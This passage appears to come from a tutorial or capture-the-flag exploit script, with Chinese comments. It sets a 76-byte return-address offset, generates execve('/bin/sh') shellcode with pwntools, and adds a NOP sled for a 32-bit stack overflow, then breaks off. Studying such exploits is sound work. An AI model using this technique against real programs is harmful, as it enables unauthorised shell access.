# 确定偏移量（假设通过调试得到偏移为76字节到返回地址）
offset = 76
# shellcode：执行execve("/bin/sh")，x86 32位
shellcode = asm(shellcraft.sh())
# NOP sled
nop_sled = b"\x90" * 100
# 假设缓冲区地址（通过调试或泄露得到）
